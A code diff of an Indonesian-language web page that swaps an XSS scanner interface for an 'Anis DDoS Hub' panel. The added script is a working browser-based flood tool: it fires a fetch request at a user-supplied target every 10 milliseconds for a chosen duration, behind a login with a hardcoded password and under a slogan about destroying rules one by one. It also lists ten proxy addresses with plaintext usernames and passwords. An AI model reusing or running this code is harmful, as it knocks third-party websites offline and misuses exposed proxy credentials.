@@ -2,44 +2,84 @@
 <html lang="id">
 <head>
   <meta charset="utf-8"/>
-  <title>XSS Ganas | GitHub Pages</title>
-  <link rel="stylesheet" href="assets/app.css"/>
+  <title>Anis DDoS Hub</title>
+  <link rel="stylesheet" href="style.css"/>
 </head>
 <body>
-<main class="wrap">
-  <h1>XSS <span class="green">Ganas</span></h1>
 
-  <section class="panel">
-    <label>Target URL
-      <input id="url" type="url" placeholder="https://target.com" required>
-    </label>
-    <div class="row">
-      <label>Max URL <input id="max" type="number" value="20" min="1" max="100"></label>
-      <label>Delay ms <input id="delay" type="number" value="300" min="100"></label>
-    </div>
-    <div class="actions">
-      <button id="start" class="glow">Start Scan</button>
-      <button id="stop" disabled>Stop</button>
-      <button id="export">Export CSV</button>
-    </div>
-  </section>
+<!-- LOGIN -->
+<div id="loginBox">
+  <h1 class="glitch" data-text="HIDUPP PUAN-vip">Oxylus-vip</h1>
+  <input id="user" placeholder="User"/>
+  <input id="pass" type="password" placeholder="Pass"/>
+  <button onclick="login()">ENTER</button>
+</div>
 
-  <section class="stat">
-    <div>crawled <span id="crawl">0</span></div>
-    <div>attacked <span id="total">0</span></div>
-    <div>found <span id="found">0</span></div>
-  </section>
+<!-- PANEL -->
+<div id="panel" style="display:none;">
+  <h2>Selamat Datang, <span id="uname"></span> 😈</h2>
+  <p class="sambutan">"Semua aturan adalah lelucon. Mari kita hancurkan satu per satu."</p>
 
-  <div class="bar"><div id="bar"></div></div>
+  <input id="host" placeholder="https://target.com"/>
+  <input id="dur" type="number" placeholder="Durasi (detik)" value="60"/>
+  <button onclick="fire()">FIRE</button>
+  <pre id="log"></pre>
+</div>
 
-  <section class="log">
-    <pre id="logs"></pre>
-  </section>
+<script>
+function login(){
+  const u=document.getElementById('user').value;
+  const p=document.getElementById('pass').value;
+  if(u==='oxylus' && p==='12092010'){
+    document.getElementById('loginBox').style.display='none';
+    document.getElementById('panel').style.display='block';
+    document.getElementById('uname').textContent=u;
+  }else{
+    alert('Salah, coba lagi tolol 😜');
+  }
+}
 
-  <!-- iframe pool -->
-  <div id="pool" style="display:none"></div>
-</main>
+// --- 10 SOCKS5 HTTP-PROXY authed ---
+const proxies = [
+  'https://ttsxvywv:9142tg5mr1up@142.111.48.253:7030',
+  'https://ttsxvywv:9142tg5mr1up@31.59.20.176:6754',
+  'https://ttsxvywv:9142tg5mr1up@23.95.150.145:6114',
+  'https://ttsxvywv:9142tg5mr1up@198.23.239.134:6540',
+  'https://ttsxvywv:9142tg5mr1up@107.172.163.27:6543',
+  'https://ttsxvywv:9142tg5mr1up@198.105.121.200:6462',
+  'https://ttsxvywv:9142tg5mr1up@64.137.96.74:6641',
+  'https://ttsxvywv:9142tg5mr1up@84.247.60.125:6095',
+  'https://ttsxvywv:9142tg5mr1up@216.10.27.159:6837',
+  'https://ttsxvywv:9142tg5mr1up@142.111.67.146:5611'
+];
+function randProxy(){ return proxies[Math.floor(Math.random()*proxies.length)]; }
 
-<script src="assets/app.js" type="module"></script>
+async function fire(){
+  const host=document.getElementById('host').value;
+  const dur =parseInt(document.getElementById('dur').value);
+  const log =document.getElementById('log');
+  log.textContent='[+] Starting browser flood...\n';
+  let ok=0, fail=0;
+  const ctrl=new AbortController();
+  const tOut=setTimeout(()=>ctrl.abort(),dur*1000);
+
+  const loop=setInterval(async()=>{
+    try{
+      const r=await fetch(host,{
+        mode:'no-cors',
+        cache:'no-store',
+        signal:ctrl.signal,
+        headers:{'User-Agent':'Oxylus-vip'}
+      });
+      ok++;
+    }catch(e){ fail++; }
+  },10); // 100 req/s per tab
+
+  setTimeout(()=>{
+    clearInterval(loop);
+    log.textContent+=`[+] Done → OK:${ok}  FAIL:${fail}\n`;
+  },dur*1000);
+}
+</script>
 </body>
 </html>
